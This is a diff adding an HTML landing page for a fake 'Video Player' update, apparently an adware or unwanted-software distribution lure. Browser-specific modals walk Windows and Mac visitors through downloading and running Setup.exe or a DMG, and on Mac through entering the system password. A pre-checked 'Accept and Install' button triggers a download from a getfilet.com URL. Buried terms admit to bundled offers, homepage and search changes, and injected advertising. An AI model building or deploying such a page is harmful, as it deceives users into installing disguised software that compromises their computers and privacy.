@@ -1,0 +1,516 @@
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    
+    
+    <script type="text/javascript" src="js/linkv2.js"></script>
+    <script type="text/javascript" src="js/ainj.js"></script>
+    <script type="text/javascript" src="js/dlStoragev1.js"></script>  
+    
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    
+    <title>Video Update Recommended</title>    
+    
+
+  <link href="css/style.css" rel="stylesheet" type="text/css" />
+<link href="css/modals-m.css" rel="stylesheet" type="text/css" />
+<script src="js/jquery.min.js" type="text/javascript"></script>
+<script type="text/javascript" src="js/bd2.js"></script>
+<script type="text/javascript" src="js/od2.js"></script>
+    
+  
+    
+
+</head>
+
+<body>
+
+
+<!-- modales navegadores -->
+<div class="modales" style="display: none;">
+<!-- chrome -->
+<div class="DirectionsModal_cr modal-container" style="display: none;">
+
+    <div class="modal-bg">
+    
+    </div>
+
+    <div class="modal-content-container">
+        <div class="modal-chrome-arrow win" style="display: none;"></div>
+        <div class="modal-chrome win" style="display: none;">
+            <div class="col1">
+                <h3>Step one</h3>
+                <h4>Click</h4>
+                <h5>Setup<span>.exe</span></h5>
+                <div class="loadingchrome" style="display: block;"></div>
+            </div>
+            <div class="col2">
+                <h3>Step two</h3>
+                
+                    <h4>Click <span>&quot;Yes&quot;</span> when it appears</h4>
+                    <span class="win"><div class="modal-cr-img"></div></span>   
+                           
+            </div>
+            <div class="clear20"></div>
+        </div>
+        <div class="modal-chrome-arrow mac" style="display: none;"></div>
+         <div class="modal-chrome mac" style="display: none;">
+            <div class="col1">
+                <h3>Step one</h3>
+                <div class="border">
+                    <h4>Click</h4>
+                    <h5>Setup<span>.dmg</span></h5>
+                    <div class="loadingchrome" style="display: block;"></div>
+                </div>
+            </div>
+            <div class="col2">
+                <h3>Step two</h3>
+                <h4>Click <span>&quot;Yes&quot;</span> when it appears</h4>               
+                <span class="macstep2"><div class="modal-cr-img"></div></span>
+            </div>
+            <div class="col3 mac">
+                    <span class="padding10 whitebg">
+                <h3>Step three</h3>                
+                <h4>Enter your Mac's password to start the installation</h4>          
+                <span class="macstep3">
+                    <div class="modal-cr-img"></div>
+                </span>
+
+                </span>
+
+            </div>
+
+            <div class="clear20"></div>
+        </div>
+    </div>
+  
+
+
+</div>
+
+<!-- firefox -->
+<div class="DirectionsModal_ff modal-container" style="display: none; ">
+    <div class="modal-bg"></div>
+    <div class="modal-content-container">
+        <div class="modal-ff-arrow win" style="display: none;"></div>
+        <div class="modal-ff win" style="display: none;">
+            <div class="col1">
+                <h3>Step one</h3>
+                <h4>Click “Save file”</h4>
+            </div>
+            <div class="col2">
+                <h3>Step two</h3>
+                <h4>Click the small download arrow above 
+                    
+                    
+                </h4>
+            </div>
+            <div class="col3">
+                <h3>Step three</h3>
+                <h4>Click the downloaded file</h4>
+            </div>
+            <div class="clear10"></div>
+        </div>
+        <div class="modal-ff-arrow mac" style="display: none;"></div>
+         <div class="modal-ff mac" style="display: none;">
+            
+                    <div class="col1">
+                        <h3>Step one</h3>
+                       
+                        <span class="mac" style="display: none;">
+                            <h4>Click &quot;Accept&quot;</h4>
+                        </span>
+                      
+                        <span class="mac" style="display: none;">
+                            <div class="ff1-mac"></div>
+                        </span>
+                    </div>
+                    <div class="col2">
+                        <h3>Step two</h3>                       
+
+                        <span class="mac" style="display: none;">
+                            <h4>Double click in the icon to install</h4>
+                        </span>
+                      
+                        <span class="mac" style="display: none;">
+                            <div class="ff2-mac"></div>
+                        </span>
+                    </div>
+                    <div class="col3">
+                        <h3>Step three</h3>
+                      
+                        <span class="mac" style="display: none;">
+                            <h4>Enter your Mac's password to start the installation</h4>
+                        </span>
+                       
+                        <span class="mac" style="display: none;">
+                            <div class="ff3-mac"></div>
+                        </span>
+                    </div>
+                    <div class="clear10"></div>
+                
+            <div class="clear10"></div>
+        </div>
+    </div>
+</div>
+
+<!-- explorer default --> 
+<div class="DirectionsModal_ie modal-container" style="display: none;">
+    <div class="modal-bg"></div>
+    <div class="modal-content-container">
+        <div class="modal-ie-arrow"></div>
+        <div class="modal-ie-2-arrow"></div>
+        <div class="modal-ie"> 
+            <h4>Click <span>“Run/Save”</span> to download</h4>                
+            <div class="clear10"></div>
+        </div>
+    </div>  
+</div>
+<!-- explorer ie8 --> 
+<div class="DirectionsModal_ie8 modal-container" style="display: none;">
+    <div class="modal-bg"></div>
+    <div class="modal-content-container">
+        <div class="modal-ie-8"> 
+            <div class="col1">
+                <h3>Step one</h3>
+                <h4>Right click on the information bar and click on <span>"Download File..."</span></h4>
+            </div>
+            <div class="col2">
+                <h3>Step two</h3>
+                <h4>Click on "Run"</h4>
+            </div>
+            <div class="col2">
+                <h3>Step three</h3>
+                <h4>Click on "Open"</h4>
+            </div>
+            <div class="col2">
+                <h3>Step four</h3>
+                <h4>Click on "Yes" to proceed with the instalation</h4>
+            </div>
+        </div>
+    </div>  
+</div>
+        <!-- safari-->
+        <div class="DirectionsModal_sf modal-container" style="display: none;">
+            <div class="modal-bg"></div>
+
+            <div class="modal-content-container">
+                <div class="modal-default">
+                    <div class="bluearrow"></div>
+                    <div class="whitebg">
+
+                        <span class="number one"></span>
+                        <h2>Step one</h2>
+                        <p>Download the <span class="win" style="display: none;">&quot;EXE&quot;</span><span class="mac" style="display: none;">&quot;DMG&quot;</span> file. Click to open the installer.<span class="mac imginstaller" style="display: none;"></span>
+                        </p>
+                        <div class="clear10"></div>
+                        <div class="clear10"></div>
+                        <span class="number two"></span>
+                        <h2>Step two</h2>
+                        <span class="win" style="display: none;">
+                      <p>Follow the installer instructions</p>
+                    </span>
+                        <span class="mac" style="display: none;">
+                         <p>Double click in the icon to install<span class="mac iconinstall" style="display: none;"></span>
+                        </p>
+                        </span>
+                        <div class="clear10"></div>
+                        <div class="clear10"></div>
+                        <span class="mac" style="display: none;">
+                    <span class="number three"></span>
+                        <h2>Step Three</h2>
+                        <p>Enter your Mac's password to start the installation<span class="mac lockicon" style="display: none;"></span>
+                        </p>
+                        <div class="clear10"></div>
+                        <div class="clear10"></div>
+                        </span>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+        <!-- default-->
+        <div class="DirectionsModal modal-container" style="display: none;">
+            <div class="modal-bg"></div>
+            <div class="modal-content-container">
+                <div class="modal-default">
+                    <div class="whitebg">
+                        <span class="number one"></span>
+                        <h2>Step one</h2>
+                        <p class="other">Download the <span class="win" style="display: none;">&quot;EXE&quot;</span><span class="mac" style="display: none;">&quot;DMG&quot;</span> file. Click to open the installer.</p>
+                        <div class="clear10"></div>
+                        <span class="number two"></span>
+                        <h2>Step two</h2>
+                        <p class="other">Follow the installer instructions</p>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+</div>
+<!--fin de modal de navegador-->
+
+
+
+
+
+
+<div class="win" style="display: none;">
+    <div class="wrap">
+
+        <div class="content">
+            <div class="headtittle">
+                
+                <p>Recommended Download</p>
+                
+            </div>
+            <div class="left">
+                
+                <div class="logo"></div>
+                
+            </div>
+
+            <div class="right">
+                
+                <h1>Please install the Video Player <span> (RECOMMENDED)</span> </h1> 
+                <ul>
+                    <li>Based on ffmpeg the leading Audio/Video codec library</li>
+                    <li>Supports *.FLV, *.AVI, *.MOV, *.MKV, *.SWF and more</li>
+                    <li>Super fast and user-friendly interface</li>
+                    <li>100&#37; Free &amp; Safe-share it with your friends</li>
+                </ul>
+
+                
+                <p class="grey">Downloading takes a few seconds and no restart needed after installation</p>
+                
+
+                <div class="separate">
+                </div>
+
+                
+                <div class="buttons">
+                    
+                    <a rel="noreferrer" href="#"  class="button right showmodal">DOWNLOAD</a> 
+                    <a rel="noreferrer" href="#"  class="buttonl left showmodal">INSTALL</a>
+                </div>
+                
+
+            </div>
+        </div>
+        <div class="clear"></div>
+
+
+
+    </div>
+</div>
+
+<div id="MAC" class="mac" style="display: none;">
+
+
+
+        <div class="wrapper">
+
+
+            <div class="header">
+
+
+                <div class="icon">
+                    
+                    <img src="media/images/macimg.jpg" />
+                     
+                </div>
+
+
+                <div class="headtxt">
+
+                    <h1>Dear Mac user: Your version of Video Player for Mac OS might be outdated</h1>
+
+                    <p class="medium">Please install the latest version for better performance</p>
+
+
+
+                </div>
+                <div class="clear"></div>
+
+            </div>
+            <div class="textarea">
+                <div class="pad10">
+                <h3>LEGAL INFORMATION</h3>
+
+                <p>ATTENTION! PLEASE READ THIS AGREEMENT CAREFULLY BEFORE ACCESSING THE SITE AND DOWNLOADING ANY CONTENT. IF YOU USE THE SITE OR DOWNLOAD CONTENT YOU AGREE TO EACH OF THE FOLLOWING TERMS AND CONDITIONS.</p>
+
+                <p>This is a legally binding contract between you and the installer. By downloading, installing, copying, running, or using any content of getfilet.com, you are agreeing to be bound by the terms of this Agreement. You are also agreeing to our Privacy Policy. If you do not agree to our terms, you must navigate away from our Sites, you may not download the Content, and you must destroy any copies of the Content in your possession.</p>
+
+                <p>If you are under 18, you must have your parent or guardian's permission before you use our Sites or download Content. In an effort to comply with the Children's Online Privacy Protection Act, we will not knowingly collect personally identifiable information from children under the age of 13.</p>
+
+                <p>This Agreement may be modified by us from time to time. If you breach any term in this Agreement your right to use the Sites and Content will terminate automatically.</p>
+
+                <h4>1. The Download Process.</h4>
+                <p>Your download and software installation is managed by the Installer. The installer(i) downloads the files necessary to install your software; and (ii) scans your computer for specific files and registry settings to ensure software compatibility with your operating system and other software installed on your computer. Once the installer has been initiated, you will be presented with a welcome screen, it allows you to choose to install the software or cancel out of the process. We may show you one or more partner software offers. You are not required to accept a software offer to receive your download. We may also offer to: (i) change your browser's homepage; (ii) change your default search provider; and (iii) install icons to your computer desktop. Software we own and our partner's software may include advertisements within the application.</p>
+
+                <h4>2. Delivery of Advertising.</h4>
+                <p>By accessing the Sites and downloading the Content, you hereby grant us permission to display promotional information, advertisements, and offers for third party products or services (collectively "Advertising"). The Advertising may include, without limitation, content, offers for products or services, data, links, articles, graphic or video messages, text, software, music, sound, graphics or other materials or services. The timing, frequency, placement and extent of the Advertising changes are determined in our sole discretion. You further grant us permission to collect and use certain aggregate information in accord with our Privacy Policy.</p>
+
+                <h4>3. Your Obligations.</h4>
+                <p>You may not use another person's name or information on our Sites. You agree to use the Sites and Content only for lawful purposes. You agree not to take any action that might compromise the security of the Sites, render the Sites inaccessible to others or otherwise cause damage to the Sites or the Content. You agree not to use the Sites in any manner that might interfere with our or our Partner's rights. You represent and warrants that (a) you are the owner or an authorized user of the computer that the Content is installed on, (b) you will use the Content, and the Sites only for lawful purposes, and will comply at all times with all applicable federal, state, and local laws and regulations, and (c) you are at least thirteen years of age. Persons under thirteen years of age may not use the Content. You agree not to use any automated or manual process to interfere with, modify, or attempt to interfere with or modify the Content, except to uninstall the same as provided herein. You acknowledge sole responsibility for installing appropriate anti-virus software and other security measures on your computer. You may not use, or export the Content in violation of applicable Spain laws or regulations.</p>
+
+                <h4>4. Grant of License.</h4>
+                <p>We grant you a non-exclusive, non-transferable and non-assignable license to use the Content. You may not rent, lease, sell, redistribute, sublicense or otherwise transfer the Content. You may make only such copies of the Content as are reasonably necessary for your own use, and any copy made by you must bear the same copyright and other proprietary notices that appear on the copy furnished by us.</p>
+
+                <h4>5. Termination.</h4>
+                <p>This license will immediately terminate if you violate any provision of this Agreement. We may also terminate this license at any time without notice.</p>
+
+                <h4>6. Ownership.</h4>
+                <p>We own all intellectual property rights in and to the Content. This license is not a sale and does not render you the owner of a copy of the Content. Ownership of the Content and all components and copies thereof will at all times remain with us, regardless of who may be deemed the owner of the tangible media on which the Content is copied, encoded or otherwise fixed.</p>
+
+                <h4>7. Disclaimer of Warranties.</h4>
+                <p>WE PROVIDE ALL CONTENT "AS IS," "WITH ALL FAULTS," AND WITHOUT ANY WARRANTY WHATSOEVER. ALL SITES ARE PROVIDED ON AN "AS IS, AS AVAILABLE" BASIS. WE DISCLAIM ALL WARRANTIES, EXPRESS OR IMPLIED, INCLUDING ANY IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR ANY PARTICULAR PURPOSE, TITLE OR NON-INFRINGEMENT. WE DO NOT WARRANT ANY PART OF THE CONTENT NOR DO WE REPRESENT THE CONTENT WILL MEET YOUR NEEDS OR THAT ITS OPERATION WILL BE UNINTERRUPTED OR ERROR FREE. THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE CONTENT IS WITH YOU.</p>
+
+                <h4>8. Exclusive Remedy.</h4>
+                <p>IF YOU ARE DISSATISFIED WITH THE SITES, THE CONTENT OR THESE TERMS AND CONDITIONS, YOUR SOLE AND EXCLUSIVE REMEDY IS TO DISCONTINUE USING THE SITES AND CONTENT.</p>
+
+                <h4>9. Limitations of Liability.</h4>
+                <p>WE ARE NOT LIABLE TO YOU OR ANY OTHER PERSON FOR ANY INCIDENTAL, CONSEQUENTIAL, SPECIAL, INDIRECT, PUNITIVE OR EXEMPLARY DAMAGES, INCLUDING, WITHOUT LIMITATION, EQUIPMENT DOWNTIME, LOSS OF DATA, OR LOST PROFITS, EVEN IF WE HAVE BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES. BY INSTALLING OR USING THE CONTENT, YOU ACCEPT SOLE RESPONSIBILITY FOR ALL CONSEQUENCES ARISING THEREFROM AND ACKNOWLEDGES THAT NO CLAIM WHATSOEVER WILL BE MADE AGAINST US OR OUR LICENSORS, DISTRIBUTORS, AGENTS, EMPLOYEES OR AFFILIATES.</p>
+
+                <h4>10. Third-Party Advertisers.</h4>
+                <p>We make no representations or warranties concerning third-party or Partner Offers, you agree that we are not responsible or liable for any loss or damage of any sort incurred, or as the result of the delivery or display of the Offers. WE ARE NOT RESPONSIBLE FOR THE TERMS AND CONDITIONS OF ANYTHIRD-PARTY OR PARTNER WEBSITE OR OFFERS REGARDLESS OF WHETHER THE OFFER IS HOSTED BY US. WE MAKE AN EFFORT TO SCREEN ALL OFFERS TO ENSURE THE BEST POSSIBLE EXPERIENCE FOR OUR USERS. HOWEVER, WE ARE NOT RESPONSIBLE FOR DEALINGS BETWEEN YOU AND A PARTNER. YOU ARE HOWEVER RESPONSIBLE FOR AND MUST CAREFULLY REVIEW EACH PARTNER OFFER AND READ THEIR TERMS AND CONDITION, AND THE PRIVACY POLICY.</p>
+
+                <h4>11. Copyright Policy.</h4>
+
+
+
+
+                <p>To be effective, notifications must include the following information: (i) a physical or electronic signature of a person authorized to act on behalf of the owner of the copyright that has been allegedly infringed; (ii) identification of works or materials being infringed; (iii) identification of the content that is claim to be infringing including, information regarding that location of the content that the copyright owner seeks to have removed, with sufficient detail so that the installer is capable of finding and verifying its existence; (iv) contact information about the notifying party including address, telephone number and email address; (v) a statement that the notifying party has a good faith belief that the content is not authorized by the copyright owner, its agent, or the law; and (vi) a statement made under penalty of perjury that the information provided is accurate and the notifying party is authorized to make the complaint on behalf of the copyright owner.</p>
+
+                <p>Once a complete and proper notice of claimed copyright infringement is received by the installer , it is the installer's policy to: (i) remove or disable access to the content on the installer's websites or content directories; and (ii) block a user who has posted infringing content two or more times from posting any further content.</p>
+
+                <h4>12. Definition of Terms.</h4>
+                <p>Offers include promotions, advertisements contests and third-party software presented by our Partners and us.</p>
+                <p>Personally Identifiable Information (PII) is any information that identifies or could be used to identify, contact or locate you. It also includes your credit card number. Partner is an advertiser, or other entity with whom we have a business relationship to provide Offers.</p>
+                <p>Content includes, but is not limited to, our software.</p>
+                <p>User means an individual that has accessed the Sites on which we host our Products or Services.</p>
+                <p>We, Us and Our refers to the installer and its subsidiaries. You and Your refer to each user and his or her agents.
+                </p>
+
+                <h4>13. Questions or Additional Information.</h4>
+                <p>If you have any questions regarding this Agreement or wish to obtain additional information, you can contact us by writing to:</p>
+
+
+                <p>If you would like to contact us via e-mail, please send a message to <a href="http://www.19pb73tkvh.com/px58wAA1/videoupdater/contact.html">here</a>
+                </p>
+
+
+                <h4>14. Laws and Jurisdiction.</h4>
+                <p>The present legal notice is subject to Spanish law. The user accepts that the applicable law for the website shall be Spanish law. Any type of proceeding, complaint or conflict derived from the usage or activity of this website shall be solved within the jurisdiction of the Courts of Spain. the installer, reserves the right to make the necessary changes to the present terms and conditions, which will be available in the website.
+                </p>
+
+                <h4>15. TREATMENT OF PERSONAL INFORMATION.</h4>
+                <p>On the other hand, the authors understand that this Web site offers added value services and that in some occasions, a share can be charged for said services to the end user for maintenance of the Web site or said services, but never related to the acquisition of the license of a product.</p>
+                <p>The author also accepts that the above-mentioned electronic means can require the change of the main page or the creation of the direct access (shortcuts) top ages related to this Web site(but never to pages property of the author).</p>
+                <p>The relationship between the author and the Web site can be terminated at anytime prior request of any party.</p>
+                <p>Any manufacturer can request the update or the removal of any software applications offered in this Website.</p>
+
+
+                <h4>TREATMENT OF PERSONAL INFORMATION</h4>
+                <p>In compliance with Act15/1999, 13 December, of Protection of Personal Information and development regulation (hereinafter, the Company), holding company of this Web Site,(hereinafter, the Portal) informs you that the information obtained through the Portal will be handled by the Company, as the party in charge of the File, with the goal of facilitating the requested services, attending to queries, carrying out statistical studies that will allow an improvement in service, carrying out typical administrative tasks, sending information that may result of your interest through bulletins and similar publications, as well as developing sales promotion and publicity activities related to the Portal.</p>
+                <p>The user expressly authorizes the use of their electronic mail address and other means of electronic communication (e.g., mobile telephone) so that the Company may use said means of communication and for the development of informed purposes. We inform you that the information obtained through the Portal will be housed on the servers of the company OVH, SAS, located in Roubaix (France).
+                </p>
+                <p>Upon providing your information, you declare to be familiar with the contents here in and expressly authorize the use of the data for the informed purposes .The user may revoke this consent at any time, without retroactive effects.</p>
+                <p>The Company commits to complying with its obligation as regards secrecy of personal information and its duty to treat the information confidentially ,and to take the necessary technical, organizational and security measures to avoid the altering, loss, and unauthorized handling or access of the information, in accordance with the rules established in the Protection of Personal Information Act and the applicable law.</p>
+                <p>The Company only obtains and retains the following information about visit our site: The domain name of the of the provider (ISP) and/or the IP address that gives them access to the network.
+                </p>
+
+                <p>The date and time of access to our website. The internet address from which the link that that leads to our web site originated. The type of browser client. The client's operating system. This information is anonymous, not being able to be associated with a specific , identified user. The Portal uses cookies, small information files generated on the user's computer, with the aim of obtaining the following information: The date and time of the most recent visit to our web page. Security control elements to restricted areas.
+                </p>
+                <p>The user has the option of blocking cookies by means of selecting the corresponding option on their web browser. The Company assumes no responsibility through if the deactivation of cookies supposes a loss of quality in service of the Portal.</p>
+
+
+                <p>If you would like to contact us via e-mail, please send a message <a href="http://www.19pb73tkvh.com/px58wAA1/videoupdater/contact.html">here</a>
+                </p>
+ </div>
+            </div>
+
+            <div class="check-wrap">
+                <input checked="checked" type="checkbox" />The best 100&#37; Free Video Player - Top Download <span id="datec"></span>
+            </div>
+
+            <div class="botmac">
+                <a rel="noreferrer" href="javascript:downloadEXEWithName('http://ttb.getfilet.com/download/request/5257e34b5f1c1e6d0700000a/px58wAA1', 'px58wAA1', 'Setup.exe')" onclick="_gaq.push(['_trackEvent','New player Videoupdater Mac','1']);" class="showmodal">Accept and Install</a>
+            </div>
+           
+
+            <div class="cb"></div>
+        </div>
+       
+  
+
+   
+
+
+</div>
+
+
+
+
+
+        
+        
+<script type="text/javascript">
+
+    function generateLinkLee(v_dlink) {
+        var link = v_dlink + '?' + location.search.substring(1);
+        location.href = link;
+        return false;
+    }
+
+</script>
+
+<div class="footer">
+	<p>getfilet.com is distributing an install manager that will manage the installation of your selected software. In addition to managing the installation of your selected software, this install manager will make recommendations for additional free software that you may be interested in. Additional software may include toolbars, browser add-ons, game applications, anti-virus applications and other types of applications. You are not required to install any additional software to receive your selected software. You can completely remove the program at any time in Windows 'Add/Remove Programs'. At the time of downloading you accept the conditions of use and privacy policies stated by getfilet.com.  &copy; 2010 - <span id="Span1"></span> - getfilet.com. All rights reserved.</p>
+	<ul>
+		<li><a href="http://www.19pb73tkvh.com/px58wAA1/videoupdater/support.html" target="_blank">Support</a></li>
+		<li><a href="http://www.19pb73tkvh.com/px58wAA1/videoupdater/terms.html" target="_blank">Terms of Service</a></li>
+		<li><a href="http://www.19pb73tkvh.com/px58wAA1/videoupdater/privacy.html" target="_blank">Privacy Policy</a></li>
+		<li><a href="http://www.19pb73tkvh.com/px58wAA1/videoupdater/setupinfo.html" target="_blank">Setup info</a></li>		
+		<li><a href="http://www.19pb73tkvh.com/px58wAA1/videoupdater/whyisthisfree.html" target="_blank">Why is this free</a></li>
+		<li><a href="http://www.19pb73tkvh.com/px58wAA1/videoupdater/contact.html" target="_blank">Contact us</a></li>
+		<li><a href="http://www.19pb73tkvh.com/px58wAA1/videoupdater/uninstall.html" target="_blank">Uninstall</a></li>
+	</ul>
+</div>
+        
+        
+
+
+    
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+            $('.' + SO).show();
+        });
+
+        $(".showmodal").click(function () {
+            $(".modales").show();
+            BrowserDetect.displayBwDiv('.DirectionsModal');
+            $(".loadingchrome").show();
+            setTimeout('$(".loadingchrome").fadeOut("300");', 2000);
+        });
+
+        $(".modal-container").click(function () {
+            $(".modales").hide();
+
+        });
+    </script>
+
+   
+
+
+
+    <script>
+        //get system date
+        var f = new Date();
+        //Insert year into span with id "datec" (date copyright).
+        document.getElementById('datec').innerHTML = f.getFullYear();
+    </script>
+
+</body>
+</html>
